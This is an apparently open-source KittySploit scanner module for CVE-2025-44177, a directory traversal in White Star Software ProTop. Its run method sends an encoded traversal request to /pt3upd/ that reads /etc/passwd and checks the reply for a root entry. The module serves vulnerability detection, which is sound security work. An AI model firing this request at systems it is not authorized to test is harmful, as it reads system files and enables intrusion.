#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability was discovered in White Star Software Protop version 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'White Star Software ProTop - Directory Traversal Detection',
        'description': 'A directory traversal vulnerability was discovered in White Star Software Protop version 4.4.2-2024-11-27, specifically in the /pt3upd/ endpoint. An unauthenticated attacker can remotely read arbitrary files on the underlying OS using encoded traversal sequences.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'lfi', 'traversal', 'protop', 'whitestar', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-44177',
            'https://client.protop.co.za/',
            'https://wss.com/',
            'https://gist.github.com/stSLAYER/4a2ecfbab1215a0be0dde59c4ac0122d',
        ],
        'cve': 'CVE-2025-44177',
    }

    def run(self):
        path = '/pt3upd/..%2f..%2f..%2f..%2fetc%2fpasswd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream', 'filename="passwd"',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='White Star Software ProTop - Directory Traversal detected', path=path)
            return True
        return False

